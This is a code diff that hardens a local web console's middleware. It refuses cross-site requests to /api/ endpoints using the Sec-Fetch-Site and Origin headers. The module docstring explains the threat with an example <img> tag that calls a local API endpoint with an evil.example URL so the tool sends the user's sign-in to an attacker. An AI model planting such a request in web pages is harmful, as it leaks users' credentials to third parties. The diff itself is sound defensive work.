@@ -15,6 +15,17 @@ web page the user visits can still be turned against it:
   same-origin request from our own page sends a localhost ``Origin``; a
   cross-origin page sends the attacker's; a non-browser client (curl) sends
   none and is allowed.
+- **Cross-site reads that spend credentials.** Some ``/api/`` GETs take a
+  host from the query string and authenticate against it, so a plain
+  ``<img src="http://127.0.0.1:PORT/api/feed-info?url=https://evil.example/...">``
+  on any page makes the tool send the user's sign-in to the attacker. The
+  page never reads the answer; the harm is done by the request itself.
+  Defended by refusing cross-site requests to ``/api/`` whatever the method:
+  the browser's own ``Sec-Fetch-Site`` header says where a request came from
+  (``same-origin`` for the console's ``fetch()``, ``none`` for a typed URL
+  or bookmark); without it (an older browser, curl) a non-local ``Origin``
+  is refused as for state changes. The page and its static assets carry no
+  credentials and stay reachable, so a link to the console still opens it.
 
 We add **no** CORS headers, so cross-origin JavaScript still cannot *read*
 any response even for safe methods. Combined with the default 127.0.0.1
@@ -38,6 +49,10 @@ DEFAULT_LOCAL_HOSTS = frozenset({"localhost", "127.0.0.1", "::1"})
 
 _SAFE_METHODS = frozenset({"GET", "HEAD", "OPTIONS"})
 
+#: `Sec-Fetch-Site` values that mean "not our own page". `same-site` is
+#: another port or subdomain of the same site -- still somebody else.
+_FOREIGN_FETCH_SITES = frozenset({"cross-site", "same-site"})
+
 
 def _authority_host(authority: str) -> str:
     """The host portion of a ``Host`` header value, minus any port and IPv6
@@ -60,8 +75,9 @@ def _host_allowed(hostname: str | None, allowed: frozenset[str]) -> bool:
 
 class LocalGuardMiddleware:
     """Reject (403) any request whose ``Host`` is not a permitted localhost
-    name, and any state-changing request whose ``Origin`` is a non-local
-    site. See the module docstring for the rationale."""
+    name, any state-changing request from another site, and any ``/api/``
+    request from another site whatever its method. See the module docstring
+    for the rationale."""
 
     def __init__(self, app: ASGIApp, *, allowed_hosts: Iterable[str] | None = None) -> None:
         self.app = app
@@ -83,14 +99,31 @@ class LocalGuardMiddleware:
             await self._deny(scope, receive, send, "host not allowed")
             return
 
-        # Cross-origin/CSRF defense on state-changing methods.
-        if scope.get("method", "GET").upper() not in _SAFE_METHODS:
-            origin = headers.get("origin")
-            if origin is not None and not _host_allowed(urlparse(origin).hostname, self.allowed):
-                await self._deny(scope, receive, send, "cross-origin request refused")
-                return
+        # Cross-origin defense: every method under /api/ (a GET there can
+        # authenticate against a host the query names), state changes
+        # everywhere.
+        guarded = str(scope.get("path", "")).startswith("/api/") or (
+            scope.get("method", "GET").upper() not in _SAFE_METHODS
+        )
+        if guarded and self._foreign(headers):
+            await self._deny(scope, receive, send, "cross-origin request refused")
+            return
 
         await self.app(scope, receive, send)
+
+    def _foreign(self, headers: dict[str, str]) -> bool:
+        """Whether a browser sent this request on another site's behalf.
+
+        `Sec-Fetch-Site` is set by the browser and a page cannot forge it, so
+        when present it decides. When absent the request is from a
+        non-browser client or an older browser, and `Origin` -- attached to
+        cross-origin requests -- is the remaining signal; no `Origin` at all
+        is curl or a test, and allowed."""
+        fetch_site = headers.get("sec-fetch-site")
+        if fetch_site is not None:
+            return fetch_site.strip().lower() in _FOREIGN_FETCH_SITES
+        origin = headers.get("origin")
+        return origin is not None and not _host_allowed(urlparse(origin).hostname, self.allowed)
 
     async def _deny(self, scope: Scope, receive: Receive, send: Send, detail: str) -> None:
         await JSONResponse({"detail": detail}, status_code=403)(scope, receive, send)
